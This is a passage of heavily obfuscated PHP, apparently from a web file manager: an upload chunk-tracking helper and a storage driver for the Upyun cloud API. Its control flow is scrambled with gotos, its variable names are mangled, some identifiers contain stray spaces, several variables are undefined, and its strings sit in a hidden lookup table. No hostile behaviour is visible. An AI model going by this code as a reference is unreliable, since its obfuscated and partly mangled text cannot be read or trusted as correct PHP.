$eÛÂšİô¹„ = array($aœÆ™¶ÎÇÜ[28] => $this->fileName, $aœÆ™¶ÎÇÜ[1979] => 0, $aœÆ™¶ÎÇÜ[1980] => array()); $this->statusSet($eÛÂšİô¹„); } return $this->statusData; goto aßÉ–ÂÅõ‚; aßÉ–ÂÅõ‚: } public function statusSet($Fˆ™¡–¼Õœ) { $e˜ÉçÙÍ…  = $this->tempFile . $_SERVER[¼€¼ˆ¦‚¡][1992]; if (!$Fˆ™¡–¼Õœ) { if (file_exists($e˜ÉçÙÍ… )) { @unlink($e˜ÉçÙÍ… ); } return !0; } $this->statusData = $Fˆ™¡–¼Õœ; return file_put_contents($e˜ÉçÙÍ… , json_encode($Fˆ™¡–¼Õœ)); } private function initFileTemp() { $a¥¼¸„òĞÛ =& $_SERVER[¼€¼ˆ¦‚¡]; if (file_exists($this->tempFile)) { return; } $A˜¸Á¶™‚Ê = fopen($this->tempFile, $a¥¼¸„òĞÛ[1993]); fseek($A˜¸Á¶™‚Ê, $this->in[$a¥¼¸„òĞÛ[77]] - 1, SEEK_SET); fwrite($A˜¸Á¶™‚Ê, $a¥¼¸„òĞÛ[468]); fclose($A˜¸Á¶™‚Ê); } public function checkChunk() { goto d³ÖÌóÚù–; CÊ¤‹Âõø„: return $F¾µ‡¶»Ù„; goto dµÑ¨Æ®á’; d³ÖÌóÚù–: $C¼ƒÂ™•Œ† =& $_SERVER[¼€¼ˆ¦‚¡]; $F¾µ‡¶»Ù„ = array(); CacheLock::lock($this->tempFile); goto aù¦İÑº‡Í; aù¦İÑº‡Í: $D÷¯çì˜öˆ = $this->statusGet(); CacheLock::unlock($this->tempFile); foreach ($D÷¯çì˜öˆ[$C¼ƒÂ™•Œ†[1980]] as $f†®­öÎÀÔ) { $Eà•¯Ëâ¤ = $f†®­öÎÀÔ[$C¼ƒÂ™•Œ†[164]]; if ($Eà•¯Ëâ¤) { $F¾µ‡¶»Ù„[$C¼ƒÂ™•Œ†[1994] . $f†®­öÎÀÔ[$C¼ƒÂ™•Œ†[1035]]] = $Eà•¯Ëâ¤; } } goto CÊ¤‹Âõø„; dµÑ¨Æ®á’: } private function checkChunkHash($B›”Êç„ñÈ) { goto bĞ¡Û‘ô°•; bĞ¡Û‘ô°•: $aÑõºƒã =& $_SERVER[¼€¼ˆ¦‚¡]; if (count($B›”Êç„ñÈ[$aÑõºƒã[1980]]) != $B›”Êç„ñÈ[$aÑõºƒã[1979]]) { return !1; } $a§ôøµé£Ş = _get($this->in, $aÑõºƒã[1987]); goto aÂ°—›¸º˜; bó²Ô“‘¢¹: $bµÕ£Œ‘ô = !0; foreach ($B›”Êç„ñÈ[$aÑõºƒã[1980]] as $dêÛœ‡¿„Š) { fseek($C®ò ‹°Ö, $dêÛœ‡¿„Š[$aÑõºƒã[1982]]); $AÛŸÂÀí°­ = PathDriverStream::hash($C®ò ‹°Ö, $dêÛœ‡¿„Š[$aÑõºƒã[77]]); if ($dêÛœ‡¿„Š[$aÑõºƒã[164]] != $AÛŸÂÀí°­) { $bµÕ£Œ‘ô = !1; break; } } fclose($C®ò ‹°Ö); goto d³ äî…™ù; d³ äî…™ù: return $bµÕ£Œ‘ô; goto bË¡¡âò•â; aÂ°—›¸º˜: $B Ì¦ºÀ¿› = _get($this->in, $aÑõºƒã[1995]); if (strlen($B Ì¦ºÀ¿›) == 32 && IO::hashSimple($this->tempFile) == $a§ôøµé£Ş && IO::hashMd5($this->tempFile) == $B Ì¦ºÀ¿›) { return !0; } $C®ò ‹°Ö = fopen($this->tempFile, $aÑõºƒã[1170]); goto bó²Ô“‘¢¹; bË¡¡âò•â: } public static function fileName() { goto eÜ…ğ®ñ¬ª; dä˜ğÅ¿‘Š: $BŞäâµ‹Á = $BŞäâµ‹Á ? $BŞäâµ‹Á : time(); $FéìÅ­Ô = strtolower($f‚òÛ —ôÍ); if ($FéìÅ­Ô == $b·‘òğöÇÒ[1997] || $FéìÅ­Ô == $b·‘òğöÇÒ[1998]) { $f‚òÛ —ôÍ = date($b·‘òğöÇÒ[686], $BŞäâµ‹Á) . $b·‘òğöÇÒ[70] . $in[$b·‘òğöÇÒ[77]] . $b·‘òğöÇÒ[1629]; } else { if ($FéìÅ­Ô == $b·‘òğöÇÒ[1999]) { $f‚òÛ —ôÍ = date($b·‘òğöÇÒ[686], $BŞäâµ‹Á) . $b·‘òğöÇÒ[70] . $in[$b·‘òğöÇÒ[77]] . $b·‘òğöÇÒ[2000]; } } goto Fùî°éºØç; eÜ…ğ®ñ¬ª: $b·‘òğöÇÒ =& $_SERVER[¼€¼ˆ¦‚¡]; global $in; $f‚òÛ —ôÍ = isset($in[$b·‘òğöÇÒ[28]]) ? $in[$b·‘òğöÇÒ[28]] : $b·‘òğöÇÒ[33]; goto A†ñé¡–Ã®; Fùî°éºØç: return KodIO::clear($f‚òÛ —ôÍ); goto E÷Ê±¤Ö—À; A†ñé¡–Ã®: if (!empty($_FILES)) { $f‚òÛ —ôÍ = $f‚òÛ —ôÍ ? $f‚òÛ —ôÍ : $_FILES[$b·‘òğöÇÒ[167]][$b·‘òğöÇÒ[386]]; } if (!is_wap()) { return KodIO::clear($f‚òÛ —ôÍ); } $BŞäâµ‹Á = strtotime($in[$b·‘òğöÇÒ[1996]]); goto dä˜ğÅ¿‘Š; E÷Ê±¤Ö—À: } private function errorInfo($d¹Œ¿¬ªÁ) { $F¡âšŒ‘À =& $_SERVER[¼€¼ˆ¦‚¡]; $cŒ‘òÔÆ¿¹ = array($F¡âšŒ‘À[2001], $F¡âšŒ‘À[2002], $F¡âšŒ‘À[2003], $F¡âšŒ‘À[2004], $F¡âšŒ‘À[2005], $F¡âšŒ‘À[2006], $F¡âšŒ‘À[2007], $F¡âšŒ‘À[2008]); return $d¹Œ¿¬ªÁ . $F¡âšŒ‘À[4] . $cŒ‘òÔÆ¿¹[$d¹Œ¿¬ªÁ]; } } goto c‹ÜÙãÖª; CÁÓ­£ñ•¼: class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\150\164\164\160\x3a\x2f\x2f\x76\x30\56\x61\160\x69\x2e\165\160\x79\165\156\x2e\143\x6f\155"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($BìèÄ¢ôïÒ) { parent::__construct(); $this->_init($BìèÄ¢ôïÒ); } public function _init($f–Ìó–æ¯ä) { foreach ($f–Ìó–æ¯ä as $F¸µ§ĞêÀ´ => $e£¸¤İøö) { if (isset($this->{$F¸µ§ĞêÀ´})) { $this->{$F¸µ§ĞêÀ´} = $e£¸¤İøö; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { show_json($_SERVER[¼€¼ˆ¦‚¡][1241], !1); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($FÚİÂíé’, $aÙªÒèÑÆ = "\107\x45\x54") { $a“˜ÊÉ´ºƒ =& $_SERVER[¼€¼ˆ¦‚¡]; $a•²ƒ«ìô = gmdate($a“˜ÊÉ´ºƒ[1205]); $b–×ÃÈ¨Š = base64_encode(hash_hmac($a“˜ÊÉ´ºƒ[1242], "{$aÙªÒèÑÆ}\46{$FÚİÂíé’}\46{$a•²ƒ«ìô}", md5("{$this->userpass}"), !0)); $c¸²Š ¹²¬ = array("\x41\165\164\x68\157\162\151\x7a\141\x74\151\x6f\156\x3a\x55\120\x59\125\116\40{$this->username}\72{$b–×ÃÈ¨Š}", "\104\141\164\145\x3a{$a•²ƒ«ìô}"); return $c¸²Š ¹²¬; } public function ussRequest($d ÇÕ´, $B¯íî÷êŞÇ = "\107\105\124", $D«–§ê¨ôñ = false, $B†ÚÓŠŒ«ï = false, $e£•¤¹ğ¶ø = false) { goto bòÊŞÄÙ„”; C­ÍÜâáÂ: $EÄÂÖ¢ååÙ = $this->ussHeaders($f·ğù—İäÙ, $B¯íî÷êŞÇ); if ($B†ÚÓŠŒ«ï) { $EÄÂÖ¢ååÙ = array_merge($EÄÂÖ¢ååÙ, $B†ÚÓŠŒ«ï); } $Aâ·À‚ÙÍÌ = url_request($this->endpoint . $f·ğù—İäÙ, $B¯íî÷êŞÇ, $D«–§ê¨ôñ, $EÄÂÖ¢ååÙ, $e£•¤¹ğ¶ø); goto AâŒÏ†‡ÅØ; AâŒÏ†‡ÅØ: if (!$Aâ·À‚ÙÍÌ) { return array($D¾šÙï±ÂÆ[1031] => !1, $D¾šÙï±ÂÆ[1033] => $D¾šÙï±ÂÆ[1243]); } if (strtolower($B¯íî÷êŞÇ) == $D¾šÙï±ÂÆ[184] || in_array($Aâ·À‚ÙÍÌ[$D¾šÙï±ÂÆ[1031]], array($D¾šÙï±ÂÆ[1100], $D¾šÙï±ÂÆ[1244]))) { $D«–§ê¨ôñ = $Aâ·À‚ÙÍÌ[$D¾šÙï±ÂÆ[1245]]; } else { $D«–§ê¨ôñ = json_decode($Aâ·À‚ÙÍÌ[$D¾šÙï±ÂÆ[1033]], !0); if (!$D«–§ê¨ôñ) { $D«–§ê¨ôñ = $Aâ·À‚ÙÍÌ[$D¾šÙï±ÂÆ[1033]]; } else { if (!$Aâ·À‚ÙÍÌ[$D¾šÙï±ÂÆ[685]] && isset($D«–§ê¨ôñ[$D¾šÙï±ÂÆ[1246]])) { $D«–§ê¨ôñ = $D«–§ê¨ôñ[$D¾šÙï±ÂÆ[1246]]; } } } return array($D¾šÙï±ÂÆ[1031] => $Aâ·À‚ÙÍÌ[$D¾šÙï±ÂÆ[685]], $D¾šÙï±ÂÆ[1033] => $D«–§ê¨ôñ); goto AŒ‡„í¶Œ…; bòÊŞÄÙ„”: $D¾šÙï±ÂÆ =& $_SERVER[¼€¼ˆ¦‚¡]; $d ÇÕ´ = trim($d ÇÕ´, $D¾šÙï±ÂÆ[8]); $f·ğù—İäÙ = "\x2f{$this->bucket}\57{$d ÇÕ´}"; goto C­ÍÜâáÂ; AŒ‡„í¶Œ…: } public function mkfile($eÀ¨Ü¼Š‰, $cçÇÉŸ ´ = '', $cáÁ§à¶¾ = REPEAT_RENAME) { if ($this->setContent($eÀ¨Ü¼Š‰, $cçÇÉŸ ´)) { return $this->getPathOuter($eÀ¨Ü¼Š‰); } return !1; } public function mkdir($a…ƒÓÅ¾³, $E¨“®ËÒŠĞ = REPEAT_SKIP) { $E–÷‡†²¾ =& $_SERVER[¼€¼ˆ¦‚¡]; $cìù•Ò•ã = trim($a…ƒÓÅ¾³, $E–÷‡†²¾[8]); if ($this->_isFolder($cìù•Ò•ã)) { return $this->getPathOuter($cìù•Ò•ã); } $e©‡ºãîÛ… = array($E–÷‡†²¾[1247]); $fÒ«¡¶¦È = $this->ussRequest($cìù•Ò•ã, $E–÷‡†²¾[212], !1, $e©‡ºãîÛ…); return $fÒ«¡¶¦È[$E–÷‡†²¾[1031]] ? $this->getPathOuter($cìù•Ò•ã) : !1; } public function copyFile($dÊô‹Ë×„¨, $EÏ«É£Î£) { $FñÑÊ‘ºØ¹ =& $_SERVER[¼€¼ˆ¦‚¡]; $FºÀ“šÎ = array($FñÑÊ‘ºØ¹[1248] . "\57{$this->bucket}\x2f{$dÊô‹Ë×„¨}", $FñÑÊ‘ºØ¹[1249]); $eëìœÜÀ®¶ = $this->ussRequest($EÏ«É£Î£, $FñÑÊ‘ºØ¹[214], !1, $FºÀ“šÎ); return $eëìœÜÀ®¶[$FñÑÊ‘ºØ¹[1031]] ? !0 : $this->getPathOuter($EÏ«É£Î£); } public function moveFile($f÷‚Îñì´, $c×ó¤¤äÏæ) { $D”£ÓËŞˆ“ =& $_SERVER[¼€¼ˆ¦‚¡]; $fèá¥…×è± = array($D”£ÓËŞˆ“[1250] . "\x2f{$this->bucket}\x2f{$f÷‚Îñì´}", $D”£ÓËŞˆ“[1249]); $a÷êÒ¤Á¯‘ = $this->ussRequest($c×ó¤¤äÏæ, $D”£ÓËŞˆ“[214], !1, $fèá¥…×è±); return $a÷êÒ¤Á¯‘[$D”£ÓËŞˆ“[1031]] ? !0 : $this->getPathOuter($c×ó¤¤äÏæ); } public function delFile($EÀÜ†ÅãÕŞ) { $A–ÙŠÛÔùí =& $_SERVER[¼€¼ˆ¦‚¡]; $EßÍà–Œ¿… = $this->ussRequest($EÀÜ†ÅãÕŞ, $A–ÙŠÛÔùí[1251]); return $EßÍà–Œ¿…[$A–ÙŠÛÔùí[1031]] ? !0 : !1; } public function delFolder($CŞÉ„«ØĞ¶) { $F²â–ÜìÔ’ =& $_SERVER[¼€¼ˆ¦‚¡]; $E†¼‡èÆÊå = $this->listAll($CŞÉ„«ØĞ¶); krsort($E†¼‡èÆÊå); foreach ($E†¼‡èÆÊå as $D§¤òÅ®¥É) { $this->ussRequest($D§¤òÅ®¥É[$F²â–ÜìÔ’[75]], $F²â–ÜìÔ’[1251]); } return $this->ussRequest($CŞÉ„«ØĞ¶, $F²â–ÜìÔ’[1251]); } public function rename($E‚²…·ÍÄ, $fªöô¨è) { if ($this->isFile($E‚²…·ÍÄ)) { $fªöô¨è = get_path_father($E‚²…·ÍÄ) . $fªöô¨è; return $this->moveFile($E‚²…·ÍÄ, $fªöô¨è); } return $this->renameObject($E‚²…·ÍÄ, $fªöô¨è); } public function fileInfo($B×‰ÏÈ‡Ë¬, $c“å³‚È¯ = false, $f‹Šˆ­Şâˆ = array()) { $c×¥‹Œ›Š =& $_SERVER[¼€¼ˆ¦‚¡]; if ($c“å³‚È¯) { return array($c×¥‹Œ›Š[28] => $this->pathThis($B×‰ÏÈ‡Ë¬), $c×¥‹Œ›Š[75] => $this->getPathOuter($c×¥‹Œ›Š[8] . $B×‰ÏÈ‡Ë¬), $c×¥‹Œ›Š[29] => $c×¥‹Œ›Š[167], $c×¥‹Œ›Š[77] => isset($f‹Šˆ­Şâˆ[$c×¥‹Œ›Š[325]]) ? $f‹Šˆ­Şâˆ[$c×¥‹Œ›Š[325]] : 0, $c×¥‹Œ›Š[160] => $this->ext($B×‰ÏÈ‡Ë¬)); } $f„¬¾Şª = array($c×¥‹Œ›Š[28] => $this->pathThis($B×‰ÏÈ‡Ë¬), $c×¥‹Œ›Š[75] => $this->getPathOuter($c×¥‹Œ›Š[8] . $B×‰ÏÈ‡Ë¬), $c×¥‹Œ›Š[29] => $c×¥‹Œ›Š[167], $c×¥‹Œ›Š[187] => 0, $c×¥‹Œ›Š[107] => isset($EºÂ²•²§¸[$c×¥‹Œ›Š[1252]]) ? $EºÂ²•²§¸[$c×¥‹Œ›Š[1252]] : 0, $c×¥‹Œ›Š[77] => isset($f‹Šˆ­Şâˆ[$c×¥‹Œ›Š[325]]) ? $f‹Šˆ­Şâˆ[$c×¥‹Œ›Š[325]] : 0, $c×¥‹Œ›Š[160] => $this->ext($B×‰ÏÈ‡Ë¬), $c×¥‹Œ›Š[188] => !0, $c×¥‹Œ›Š[189] => !0); if (empty($f‹Šˆ­Şâˆ)) { $f‹Šˆ­Şâˆ = $this->objectMeta($B×‰ÏÈ‡Ë¬); if (!$f‹Šˆ­Şâˆ) { return $f„¬¾Şª; } $f„¬¾Şª[$c×¥‹Œ›Š[187]] = $f‹Šˆ­Şâˆ[$c×¥‹Œ›Š[1253]]; $f„¬¾Şª[$c×¥‹Œ›Š[107]] = $f‹Šˆ­Şâˆ[$c×¥‹Œ›Š[1254]]; $f„¬¾Şª[$c×¥‹Œ›Š[77]] = $f‹Šˆ­Şâˆ[$c×¥‹Œ›Š[77]]; } return $f„¬¾Şª; } public function folderInfo($B‡¡óôø•, $C›ËÓˆøÚë = false) { $EœË¨š¤Ô =& $_SERVER[¼€¼ˆ¦‚¡]; if ($C›ËÓˆøÚë) { return array($EœË¨š¤Ô[28] => $this->pathThis($B‡¡óôø•), $EœË¨š¤Ô[75] => $this->getPathOuter($EœË¨š¤Ô[8] . $B‡¡óôø•), $EœË¨š¤Ô[29] => $EœË¨š¤Ô[76]); } $AË•¬ÕÕØ© = array($EœË¨š¤Ô[28] => $this->pathThis($B‡¡óôø•), $EœË¨š¤Ô[75] => $this->getPathOuter($EœË¨š¤Ô[8] . $B‡¡óôø•), $EœË¨š¤Ô[29] => $EœË¨š¤Ô[76], $EœË¨š¤Ô[187] => 0, $EœË¨š¤Ô[107] => isset($AÀÅÀô¦¢«[$EœË¨š¤Ô[1252]]) ? $AÀÅÀô¦¢«[$EœË¨š¤Ô[1252]] : 0, $EœË¨š¤Ô[1162] => !0, $EœË¨š¤Ô[1163] => !0); if (empty($Aëñ©Ÿˆ¤Ê)) { $Aëñ©Ÿˆ¤Ê = $this->objectMeta($B‡¡óôø•); if (!$Aëñ©Ÿˆ¤Ê) { return $AË•¬ÕÕØ©; } $AË•¬ÕÕØ©[$EœË¨š¤Ô[187]] = $Aëñ©Ÿˆ¤Ê[$EœË¨š¤Ô[1253]]; $AË•¬ÕÕØ©[$EœË¨š¤Ô[107]] = $Aëñ©Ÿˆ¤Ê[$EœË¨š¤Ô[1254]]; } return $AË•¬ÕÕØ©; } private function fileList($D¥ˆ±½Ø‹, $a²ƒÆŸò¨ = 0, $Fä³•Á±ï = 1000) { $B“”‹ª‡¬ =& $_SERVER[¼€¼ˆ¦‚¡]; $fìöÉ—³²— = array($B“”‹ª‡¬[1255], $B“”‹ª‡¬[1256] . $Fä³•Á±ï); if ($a²ƒÆŸò¨) { $fìöÉ—³²—[] = $B“”‹ª‡¬[1257] . $a²ƒÆŸò¨; } $dæ‰Úª­ˆ = $this->ussRequest($D¥ˆ±½Ø‹, $B“”‹ª‡¬[216], !1, $fìöÉ—³²—); return !$dæ‰Úª­ˆ[$B“”‹ª‡¬[1031]] ? !1 : $dæ‰Úª­ˆ[$B“”‹ª‡¬[1033]]; } public function listPath($D‘ˆ²ÈĞ—’, $CÙ˜„Òğãø = false) { goto E¿’ˆ­Ğñä; dÙ÷ã˜‡Ó¡: $AÈ¹Ÿ¾©Î = $D„½Ú§ŞÅ = array(); $dä­Çò™¸× = rtrim($D‘ˆ²ÈĞ—’, $DŒÈ¡ÁÂ–[8]) . $DŒÈ¡ÁÂ–[8]; while (!0) { $Fí‚ÅùÁÉÚ = $this->fileList($D‘ˆ²ÈĞ—’, $cŞ³÷âÆª¤, $d‹§±î¸¼); if (!$Fí‚ÅùÁÉÚ) { return !1; } $cŞ³÷âÆª¤ = isset($Fí‚ÅùÁÉÚ[$DŒÈ¡ÁÂ–[1258]]) ? $Fí‚ÅùÁÉÚ[$DŒÈ¡ÁÂ–[1258]] : $DŒÈ¡ÁÂ–[33]; $fĞ‚ÊæÅ‘ = isset($Fí‚ÅùÁÉÚ[$DŒÈ¡ÁÂ–[1259]]) ? $Fí‚ÅùÁÉÚ[$DŒÈ¡ÁÂ–[1259]] : array(); foreach ($fĞ‚ÊæÅ‘ as $b·èƒê‰Äò) { if ($b·èƒê‰Äò[$DŒÈ¡ÁÂ–[29]] == $DŒÈ¡ÁÂ–[76]) { $AÈ¹Ÿ¾©Î[] = $this->folderInfo($dä­Çò™¸× . $b·èƒê‰Äò[$DŒÈ¡ÁÂ–[28]], $CÙ˜„Òğãø, $b·èƒê‰Äò); } else { $D„½Ú§ŞÅ[] = $this->fileInfo($dä­Çò™¸× . $b·èƒê‰Äò[$DŒÈ¡ÁÂ–[28]], $CÙ˜„Òğãø, $b·èƒê‰Äò); } } if (count($fĞ‚ÊæÅ‘) < $d‹§±î¸¼) { break; } } goto A÷Ö«÷÷´; A÷Ö«÷÷´: return array($DŒÈ¡ÁÂ–[74] => $AÈ¹Ÿ¾©Î, $DŒÈ¡ÁÂ–[73] => $D„½Ú§ŞÅ); goto b°«Ó±ŒÄ­; E¿’ˆ­Ğñä: $DŒÈ¡ÁÂ– =& $_SERVER[¼€¼ˆ¦‚¡]; $cŞ³÷âÆª¤ = $DŒÈ¡ÁÂ–[33]; $d‹§±î¸¼ = 1000; goto dÙ÷ã˜‡Ó¡; b°«Ó±ŒÄ­: } private function recursionAllFiles($EµÑ»Ñù‚¼, &$AÌÚëøÑØ) { $A‹ä­Áàù— =& $_SERVER[¼€¼ˆ¦‚¡]; $d­öš«Õä = $A‹ä­Áàù—[33]; $b©®’œØÈ“ = 1000; $Bøˆƒ´”¨ = $DÍ¦Ä‰¯‡ = array(); $aàª½’å¿¥ = rtrim($EµÑ»Ñù‚¼, $A‹ä­Áàù—[8]) . $A‹ä­Áàù—[8]; while (!0) { $E³ÚÑîÀÛ = $this->fileList($EµÑ»Ñù‚¼, $d­öš«Õä, $b©®’œØÈ“); if (!$E³ÚÑîÀÛ) { return !1; } $d­öš«Õä = isset($E³ÚÑîÀÛ[$A‹ä­Áàù—[1258]]) ? $E³ÚÑîÀÛ[$A‹ä­Áàù—[1258]] : $A‹ä­Áàù—[33]; $cÌì™—­à´ = isset($E³ÚÑîÀÛ[$A‹ä­Áàù—[1259]]) ? $E³ÚÑîÀÛ[$A‹ä­Áàù—[1259]] : array(); foreach ($cÌì™—­à´ as $C¸–‘÷šğ¤) { $Cƒİ†‡«¶è = array($A‹ä­Áàù—[75] => $aàª½’å¿¥ . $C¸–‘÷šğ¤[$A‹ä­Áàù—[28]], $A‹ä­Áàù—[76] => $C¸–‘÷šğ¤[$A‹ä­Áàù—[29]] == $A‹ä­Áàù—[76] ? 1 : 0, $A‹ä­Áàù—[77] => isset($C¸–‘÷šğ¤[$A‹ä­Áàù—[325]]) ? $C¸–‘÷šğ¤[$A‹ä­Áàù—[325]] : 0); $AÌÚëøÑØ[] = $Cƒİ†‡«¶è; if ($Cƒİ†‡«¶è[$A‹ä­Áàù—[76]] == 1) { $this->recursionAllFiles($Cƒİ†‡«¶è[$A‹ä­Áàù—[75]], $AÌÚëøÑØ); } } if (count($cÌì™—­à´) < $b©®’œØÈ“) { break; } } } public function has($c¤Õ—¦§é™, $a—ó¬Ù‹¶ = false, $aÓìÉÌÏ”¬ = true) { goto E£ó Ñ…«Ú; E£ó Ñ…«Ú: $C÷Ğƒ­ˆËˆ =& $_SERVER[¼€¼ˆ¦‚¡]; $Aæªç½Ë ƒ = $C÷Ğƒ­ˆËˆ[33]; $B„î§Ïù™™ = 1000; goto CË²Û¤²ª ; CË²Û¤²ª : $eŞó¹Èãèæ = 0; $fÂØí’Îç¦ = 0; $aëŠ†÷Ê¡ = rtrim($c¤Õ—¦§é™, $C÷Ğƒ­ˆËˆ[8]) . $C÷Ğƒ­ˆËˆ[8]; goto dÓ°ï ™ïÛ; dÓ°ï ™ïÛ: while (!0) { $AÛÙÅî÷ä‘ = $this->fileList($c¤Õ—¦§é™, $Aæªç½Ë ƒ, $B„î§Ïù™™); if (!$AÛÙÅî÷ä‘) { return !1; } $Aæªç½Ë ƒ = isset($AÛÙÅî÷ä‘[$C÷Ğƒ­ˆËˆ[1258]]) ? $AÛÙÅî÷ä‘[$C÷Ğƒ­ˆËˆ[1258]] : $C÷Ğƒ­ˆËˆ[33]; $DÑÅÓ×¯× = isset($AÛÙÅî÷ä‘[$C÷Ğƒ­ˆËˆ[1259]]) ? $AÛÙÅî÷ä‘[$C÷Ğƒ­ˆËˆ[1259]] : array(); if (empty($DÑÅÓ×¯×)) { break; } $D‡©ËïÕ’ç = array_to_keyvalue($DÑÅÓ×¯×, $C÷Ğƒ­ˆËˆ[33], $C÷Ğƒ­ˆËˆ[29]); $B­Ù»®¦Õ = array_count_values($D‡©ËïÕ’ç); $d‚ĞÄ‚Áèµ = isset($B­Ù»®¦Õ[$C÷Ğƒ­ˆËˆ[76]]) ? $B­Ù»®¦Õ[$C÷Ğƒ­ˆËˆ[76]] : 0; $d¤Ö‡µ®ô› = count($D‡©ËïÕ’ç) - $d‚ĞÄ‚Áèµ; if ($a—ó¬Ù‹¶) { $fÂØí’Îç¦ += $d‚ĞÄ‚Áèµ; $eŞó¹Èãèæ += $d¤Ö‡µ®ô›; if ($e†ºÃ– ‰ˆ < $B„î§Ïù™™) { break; } continue; } if ($aÓìÉÌÏ”¬) { if ($d¤Ö‡µ®ô›) { return !0; } } else { if ($d‚ĞÄ‚Áèµ) { return !0; } } if (count($DÑÅÓ×¯×) < $B„î§Ïù™™) { break; } } if ($a—ó¬Ù‹¶) { return array($C÷Ğƒ­ˆËˆ[191] => $eŞó¹Èãèæ, $C÷Ğƒ­ˆËˆ[192] => $fÂØí’Îç¦); } return !1; goto EÛë¸˜Áİò; EÛë¸˜Áİò: } public function listAll($cÍŸô…ÖÓÔ) { $c¯…­Åì = array(); $this->recursionAllFiles($cÍŸô…ÖÓÔ, $c¯…­Åì); return $c¯…­Åì; } public function canRead($fİÕ¼ğÌÊ›) { return $this->exist($fİÕ¼ğÌÊ›) ? !0 : !1; } public function canWrite($E„ÌíåÀçã) { return $this->exist($E„ÌíåÀçã) ? !0 : !1; } public function getContent($dŞêÙãšŠ’) { return $this->fileSubstr($dŞêÙãšŠ’, 0, -1); } public function setContent($D¸Ğ¢Ê±ªê, $EÀ¨ö†„°„ = '') { $fá—ªÉçÃë =& $_SERVER[¼€¼ˆ¦‚¡]; if (!$EÀ¨ö†„°„) { $a¹ŸÕÍè³É = $this->ussRequest($D¸Ğ¢Ê±ªê, $fá—ªÉçÃë[212]); return $a¹ŸÕÍè³É[$fá—ªÉçÃë[1031]]; } $B¹à­„²à° = $this->tempFile($this->pathThis($D¸Ğ¢Ê±ªê)); file_put_contents($B¹à­„²à°, $EÀ¨ö†„°„); if ($this->upload($D¸Ğ¢Ê±ªê, $B¹à­„²à°)) { $this->tempFileRemve($B¹à­„²à°); return !0; } return !1; } public function fileSubstr($C¨Ôªš, $A¨Å¿ƒÇ»ç, $dÈÊÈ­„¶’) { $EµåÜ¸¤øƒ =& $_SERVER[¼€¼ˆ¦‚¡]; if (!($CÍ¡£Õ£§ = $this->link($C¨Ôªš))) { return !1; } $c™ÏÄ²çéé = !1; if ($dÈÊÈ­„¶’ > 0) { $bÙßŞçØŠ = $A¨Å¿ƒÇ»ç + $dÈÊÈ­„¶’ - 1; $c™ÏÄ²çéé = array($EµåÜ¸¤øƒ[1220] . $A¨Å¿ƒÇ»ç . $EµåÜ¸¤øƒ[412] . $bÙßŞçØŠ); } $FŸÚÚ£Ğ»È = url_request($CÍ¡£Õ£§, $EµåÜ¸¤øƒ[216], !1, $c™ÏÄ²çéé); return $FŸÚÚ£Ğ»È[$EµåÜ¸¤øƒ[685]] ? $FŸÚÚ£Ğ»È[$EµåÜ¸¤øƒ[1033]] : !1; } public function upload($a•Ğ±è×, $bÀÑê¹„’˜, $FÊÀåÈòÔè = false, $C‹‡ø“èÏƒ = REPEAT_REPLACE) { goto dªÀ†¥ã¹; CØ–èª·: if (!$DÔò¶«šºï[$c¼Î³¹ÕëŸ[1031]]) { return !1; } $c±‹ØŠÚÏ = $DÔò¶«šºï[$c¼Î³¹ÕëŸ[1033]]; $AêŠô¼öÅ = 0; goto Eã‹Æ¡Öá¬; Eã‹Æ¡Öá¬: $FÈâÄ»¸õ = $c±‹ØŠÚÏ[$c¼Î³¹ÕëŸ[1265]]; $b½ÌÚ·š‡ = fopen($bÀÑê¹„’˜, $c¼Î³¹ÕëŸ[1170]); if (!$b½ÌÚ·š‡) { return !1; } goto AÑÄ‰Œ¦ğ¡; AÒÖ¹“Â“Ô: $DÔò¶«šºï = $this->ussRequest($a•Ğ±è×, $c¼Î³¹ÕëŸ[214], !1, $C£Ä°ù·‰—); return $DÔò¶«šºï[$c¼Î³¹ÕëŸ[1031]] ? $this->getPathOuter($FãÑ†Ûè¤) : !1; goto fÉ˜¤Û˜Í; dªÀ†¥ã¹: $c¼Î³¹ÕëŸ =& $_SERVER[¼€¼ˆ¦‚¡]; $F‰„µÇ†Øœ = IO::size($bÀÑê¹„’˜); if ($F‰„µÇ†Øœ <= 1024 * 1024 * 200) { $CÂŒ¦„•òÉ = array($c¼Î³¹ÕëŸ[1260] . $bÀÑê¹„’˜); $DÔò¶«šºï = $this->ussRequest($a•Ğ±è×, $c¼Î³¹ÕëŸ[214], $CÂŒ¦„•òÉ); return $DÔò¶«šºï[$c¼Î³¹ÕëŸ[1031]] ? $this->getPathOuter($a•Ğ±è×) : !1; } goto B‰­Š¦’; AÑÄ‰Œ¦ğ¡: do { $D™ÒÒ¦ö = $c±‹ØŠÚÏ[$c¼Î³¹ÕëŸ[1266]]; fseek($b½ÌÚ·š‡, $AêŠô¼öÅ); $c¸‚àßñˆ = fread($b½ÌÚ·š‡, $D™ÒÒ¦ö); $Câ¡§ˆ–±° = 0; do { $Câ¡§ˆ–±°++; $c±‹ØŠÚÏ = $this->uploadPart($a•Ğ±è×, $c±‹ØŠÚÏ, $c¸‚àßñˆ); } while (!$c±‹ØŠÚÏ && $Câ¡§ˆ–±° < 3); if (!$c±‹ØŠÚÏ) { return !1; } $FÈâÄ»¸õ = $c±‹ØŠÚÏ[$c¼Î³¹ÕëŸ[1265]]; $AêŠô¼öÅ += $D™ÒÒ¦ö; } while ($FÈâÄ»¸õ != -1); fclose($b½ÌÚ·š‡); $C£Ä°ù·‰— = array($c¼Î³¹ÕëŸ[1267], $c¼Î³¹ÕëŸ[1268] . $c±‹ØŠÚÏ[$c¼Î³¹ÕëŸ[1269]], $c¼Î³¹ÕëŸ[1263]); goto AÒÖ¹“Â“Ô; B‰­Š¦’: $cÍ«¤¨¦¨Ú = 1024 * 1024 * 10; $C£Ä°ù·‰— = array($c¼Î³¹ÕëŸ[1261], $c¼Î³¹ÕëŸ[1262] . $F‰„µÇ†Øœ, $c¼Î³¹ÕëŸ[1263], $c¼Î³¹ÕëŸ[1264] . $cÍ«¤¨¦¨Ú); $DÔò¶«šºï = $this->ussRequest($a•Ğ±è×, $c¼Î³¹ÕëŸ[214], !1, $C£Ä°ù·‰—); goto CØ–èª·; fÉ˜¤Û˜Í: } private function uploadPart($A¤°Æğ™ğš, 